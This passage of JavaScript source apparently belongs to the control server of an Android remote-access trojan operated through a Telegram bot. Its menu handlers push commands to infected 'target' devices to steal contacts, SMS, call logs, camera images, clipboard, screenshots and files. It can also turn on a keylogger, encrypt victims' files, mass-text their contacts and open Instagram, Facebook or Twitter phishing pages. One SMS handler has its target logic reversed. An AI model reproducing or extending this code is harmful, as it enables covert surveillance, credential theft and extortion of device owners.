                            ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"],
                            ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"],
                            ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"],
                            ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"],
                            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"],
                            ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"],
                            ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"],
                            ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"],
                            ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"],
                            ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"],
                            ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯",],
                            ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯",],
                            ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"],
                        ],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
    } else if (actions.includes(message.text)) {
        let target = appData.get("currentTarget")
        if (message.text === '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "contacts", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "contacts", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚂𝙼𝚂 ✯') {
            if (target == "all") {
                io.to(target).emit("commend",
                    { "request": "all-sms", "extras": [] }
                )
            } else {
                io.sockets.emit("commend",
                    { "request": "all-sms", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙲𝚊𝚕𝚕𝚜 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "calls", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "calls", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [[" 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙰𝚙𝚙𝚜 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "apps", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "apps", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "main-camera", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "main-camera", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "selfie-camera", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "selfie-camera", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "clipboard", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "clipboard", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "screenshot", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "screenshot", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "keylogger-on", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "keylogger-on", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "keylogger-off", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "keylogger-off", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯') {
            if (target == "all") {
                io.sockets.emit("file-explorer",
                    { "request": "ls", "extras": [] }
                )
            } else {
                io.to(target).emit("file-explorer",
                    { "request": "ls", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "gallery", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "gallery", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "encrypt", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "encrypt", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯') {
            if (target == "all") {
                io.sockets.emit("commend",
                    { "request": "decrypt", "extras": [] }
                )
            } else {
                io.to(target).emit("commend",
                    { "request": "decrypt", "extras": [] }
                )
            }
            appData.delete("currentTarget")
            bot.sendMessage(data.id,
                "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                        "resize_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
            appData.set('currentAction', 'microphoneDuration')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
            appData.set('currentAction', 'toastText')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯') {
            appData.set('currentAction', 'smsNumber')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯') {
            appData.set('currentAction', 'vibrateDuration')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯') {
            appData.set('currentAction', 'textToAllContacts')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯') {
            appData.set('currentAction', 'notificationText')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯') {
            appData.set('currentAction', 'openUrl')
            bot.sendMessage(data.id,
                "<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚄𝚁𝙻 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚘𝚙𝚎𝚗 𝚘𝚗 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
        if (message.text === '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯') {
            appData.set('currentAction', 'phishing')
            bot.sendMessage(data.id,
                "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚝𝚑𝚎 𝚙𝚑𝚒𝚜𝚑𝚒𝚗𝚐 𝚙𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚋𝚎 𝚘𝚙𝚎𝚗𝚎𝚍 𝚘𝚗 𝚝𝚊𝚛𝚐𝚎𝚝 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n",
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["✯ 𝙸𝚗𝚜𝚝𝚊𝚐𝚛𝚊𝚖 ✯"],
                            ["✯ 𝙵𝚊𝚌𝚎𝚋𝚘𝚘𝚔 ✯"],
                            ["✯ 𝚃𝚠𝚒𝚝𝚝𝚎𝚛 ✯"],
                            ["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]
                        ],
                        "resize_keyboard": true,
                        "one_time_keyboard": true
                    }
                }
            )
        }
